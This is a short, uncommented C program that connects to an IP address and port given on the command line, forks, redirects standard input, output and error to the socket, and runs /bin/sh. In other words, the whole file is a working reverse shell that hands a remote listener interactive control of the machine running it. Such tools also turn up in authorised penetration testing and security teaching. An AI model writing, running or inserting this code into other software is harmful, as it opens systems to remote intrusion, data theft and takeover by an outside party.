#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define handle(str)                                                  \
    do {                                                             \
        perror(str);                                                 \
        exit(EXIT_FAILURE);                                          \
    } while (0);

int main(int argc, char **argv)
{
    int sockfd;
    struct sockaddr_in servaddr;

    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(atoi(argv[2]));
    if (inet_pton(AF_INET, argv[1], &servaddr.sin_addr) != 1)
        handle("inet_pton");

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        handle("socket");

    if (connect(sockfd, (struct sockaddr *)&servaddr,
                sizeof(servaddr)) == -1)
        handle("connect");

    pid_t pid;
    if ((pid = fork()) == 0) {
        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);
        execl("/bin/sh", "sh", NULL);

        perror("");
        exit(0);
    }

    return 0;
}
